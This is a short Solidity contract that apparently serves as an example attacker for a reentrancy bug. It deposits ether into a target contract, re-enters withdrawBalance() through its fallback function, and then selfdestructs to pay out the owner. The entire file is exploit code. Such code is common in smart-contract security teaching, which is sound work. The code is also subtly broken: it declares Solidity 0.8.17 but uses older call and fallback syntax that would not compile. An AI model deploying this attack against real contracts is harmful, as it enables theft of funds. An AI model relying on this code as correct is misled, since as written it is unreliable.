pragma solidity ^0.8.17;

contract ReentranceExploiter {
    bool public attackModeIsOn=false; 
    address public vulnerableContract;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit(address _vulnerableContract) public payable{
        vulnerableContract = _vulnerableContract ;
        // call addToBalance with msg.value ethers
        require(
            // solhint-disable-next-line avoid-low-level-calls
            vulnerableContract.call{ value: msg.value }(bytes4(keccak256("addToBalance()"))),
            "Call failed"
        );
    }

    function launchAttack() public{
        attackModeIsOn = true;
        // call withdrawBalance
        // withdrawBalance calls the fallback of ReentranceExploit
        require(
            // solhint-disable-next-line avoid-low-level-calls
            vulnerableContract.call(bytes4(keccak256("withdrawBalance()"))),
            "Call failed"
        );
    }  

    // This function will be executed when Reenterable sends ether to this contract
    fallback() payable {
        // atackModeIsOn is used to execute the attack only once
        // otherwise there is an infinite loop between withdrawBalance and the fallback function
        if (attackModeIsOn){
            attackModeIsOn = false;
            require(
                // solhint-disable-next-line avoid-low-level-calls
                vulnerableContract.call(bytes4(keccak256("withdrawBalance()"))),
                "Call failed"
            );
        }
    }

    function getMoney() public {
        selfdestruct(owner);
    }

}
